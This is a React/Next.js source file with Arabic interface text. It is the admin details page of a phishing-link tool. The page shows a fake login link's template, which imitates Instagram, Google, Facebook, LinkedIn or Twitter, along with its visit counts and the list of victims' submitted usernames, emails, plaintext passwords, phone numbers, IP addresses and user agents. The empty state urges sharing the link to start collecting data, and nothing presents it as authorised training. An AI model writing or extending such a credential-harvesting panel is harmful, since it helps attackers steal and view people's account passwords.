'use client'

import { useEffect, useState } from 'react'
import { useParams, useRouter } from 'next/navigation'
import { Navbar } from '@/components/layout/navbar'
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card'
import { Button } from '@/components/ui/button'
import { Badge } from '@/components/ui/badge'
import { ArrowLeft, Eye, Users, MousePointerClick, FileText, Trash2, Copy, ExternalLink } from 'lucide-react'

interface PhishingLink {
  id: string
  slug: string
  name: string
  template_type: string
  created_at: string
  visits: number
  submissions_count: number
}

interface Submission {
  id: string
  username?: string
  password?: string
  email?: string
  phone?: string
  ip_address?: string
  user_agent?: string
  created_at: string
}

export default function PhishingLinkDetailsPage() {
  const params = useParams()
  const router = useRouter()
  const id = params.id as string
  const [link, setLink] = useState<PhishingLink | null>(null)
  const [submissions, setSubmissions] = useState<Submission[]>([])
  const [loading, setLoading] = useState(true)

  useEffect(() => {
    loadData()
  }, [id])

  const loadData = async () => {
    try {
      const res = await fetch(`/api/phishing/${id}`)
      if (res.ok) {
        const data = await res.json()
        setLink(data.link)
        setSubmissions(data.submissions || [])
      }
    } catch (error) {
      console.error('Failed to load data:', error)
    } finally {
      setLoading(false)
    }
  }

  const copyLink = (slug: string) => {
    const url = `${window.location.origin}/phishing/${slug}`
    navigator.clipboard.writeText(url)
    alert('تم نسخ الرابط!')
  }

  const getTemplateIcon = (type: string) => {
    switch (type) {
      case 'instagram':
        return '📷'
      case 'google':
        return '🔍'
      case 'facebook':
        return '📘'
      case 'linkedin':
        return '💼'
      case 'twitter':
        return '🐦'
      default:
        return '🔗'
    }
  }

  const getTemplateName = (type: string) => {
    switch (type) {
      case 'instagram':
        return 'Instagram'
      case 'google':
        return 'Google'
      case 'facebook':
        return 'Facebook'
      case 'linkedin':
        return 'LinkedIn'
      case 'twitter':
        return 'Twitter'
      default:
        return 'Generic'
    }
  }

  if (loading) {
    return (
      <div className="min-h-screen bg-background">
        <Navbar userRole="USER" />
        <main className="mx-auto max-w-7xl px-6 py-10">
          <div className="text-center py-12 text-muted">جاري التحميل...</div>
        </main>
      </div>
    )
  }

  if (!link) {
    return (
      <div className="min-h-screen bg-background">
        <Navbar userRole="USER" />
        <main className="mx-auto max-w-7xl px-6 py-10">
          <div className="text-center py-12 text-muted">الرابط غير موجود</div>
        </main>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-background">
      <Navbar userRole="USER" />
      <main className="mx-auto max-w-7xl px-6 py-10 space-y-8">
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-4">
            <Button variant="outline" onClick={() => router.push('/dashboard/phishing')}>
              <ArrowLeft className="h-4 w-4 mr-2" />
              العودة
            </Button>
            <div>
              <h1 className="text-3xl font-semibold text-foreground flex items-center gap-3">
                <span className="text-4xl">{getTemplateIcon(link.template_type)}</span>
                {link.name}
              </h1>
              <p className="text-muted mt-2">تفاصيل رابط Phishing</p>
            </div>
          </div>
          <div className="flex items-center gap-3">
            <Button variant="outline" onClick={() => copyLink(link.slug)}>
              <Copy className="h-4 w-4 mr-2" />
              نسخ الرابط
            </Button>
            <Button variant="outline" onClick={() => router.push(`/phishing/${link.slug}`)}>
              <ExternalLink className="h-4 w-4 mr-2" />
              فتح الرابط
            </Button>
          </div>
        </div>

        <div className="grid gap-6 md:grid-cols-3">
          <Card>
            <CardHeader>
              <CardTitle className="text-sm font-medium text-muted">الزيارات</CardTitle>
            </CardHeader>
            <CardContent>
              <div className="text-3xl font-bold text-foreground">{link.visits}</div>
              <p className="text-xs text-muted mt-1">إجمالي عدد الزيارات</p>
            </CardContent>
          </Card>

          <Card>
            <CardHeader>
              <CardTitle className="text-sm font-medium text-muted">الإدخالات</CardTitle>
            </CardHeader>
            <CardContent>
              <div className="text-3xl font-bold text-foreground">{link.submissions_count}</div>
              <p className="text-xs text-muted mt-1">إجمالي عدد الإدخالات</p>
            </CardContent>
          </Card>

          <Card>
            <CardHeader>
              <CardTitle className="text-sm font-medium text-muted">نوع القالب</CardTitle>
            </CardHeader>
            <CardContent>
              <Badge variant="outline" className="text-lg">
                {getTemplateIcon(link.template_type)} {getTemplateName(link.template_type)}
              </Badge>
              <p className="text-xs text-muted mt-2">الرابط: /phishing/{link.slug}</p>
            </CardContent>
          </Card>
        </div>

        <Card>
          <CardHeader>
            <CardTitle className="flex items-center gap-2">
              <FileText className="h-5 w-5" />
              البيانات المدخلة ({submissions.length})
            </CardTitle>
          </CardHeader>
          <CardContent>
            {submissions.length === 0 ? (
              <div className="text-center py-12 text-muted">
                <Eye className="h-12 w-12 mx-auto mb-4 opacity-50" />
                <p>لا توجد بيانات مدخلة بعد</p>
                <p className="text-sm mt-2">شارك الرابط مع المستخدمين لبدء جمع البيانات</p>
              </div>
            ) : (
              <div className="space-y-4">
                {submissions.map((submission) => (
                  <Card key={submission.id} className="hover:shadow-md transition-shadow">
                    <CardContent className="p-6">
                      <div className="flex items-center justify-between mb-4">
                        <div className="flex items-center gap-2">
                          <Badge variant="outline">
                            {new Date(submission.created_at).toLocaleString('ar-SA')}
                          </Badge>
                        </div>
                        {submission.ip_address && (
                          <span className="text-xs text-muted">IP: {submission.ip_address}</span>
                        )}
                      </div>
                      <div className="grid gap-3 md:grid-cols-2">
                        {submission.username && (
                          <div>
                            <label className="text-xs font-medium text-muted">اسم المستخدم</label>
                            <p className="text-sm font-mono text-foreground bg-surface-muted p-2 rounded">
                              {submission.username}
                            </p>
                          </div>
                        )}
                        {submission.email && (
                          <div>
                            <label className="text-xs font-medium text-muted">البريد الإلكتروني</label>
                            <p className="text-sm font-mono text-foreground bg-surface-muted p-2 rounded">
                              {submission.email}
                            </p>
                          </div>
                        )}
                        {submission.password && (
                          <div>
                            <label className="text-xs font-medium text-muted">كلمة المرور</label>
                            <p className="text-sm font-mono text-foreground bg-surface-muted p-2 rounded">
                              {submission.password}
                            </p>
                          </div>
                        )}
                        {submission.phone && (
                          <div>
                            <label className="text-xs font-medium text-muted">رقم الهاتف</label>
                            <p className="text-sm font-mono text-foreground bg-surface-muted p-2 rounded">
                              {submission.phone}
                            </p>
                          </div>
                        )}
                      </div>
                      {submission.user_agent && (
                        <div className="mt-4 pt-4 border-t border-border">
                          <label className="text-xs font-medium text-muted">User Agent</label>
                          <p className="text-xs text-muted font-mono break-all">{submission.user_agent}</p>
                        </div>
                      )}
                    </CardContent>
                  </Card>
                ))}
              </div>
            )}
          </CardContent>
        </Card>
      </main>
    </div>
  )
}

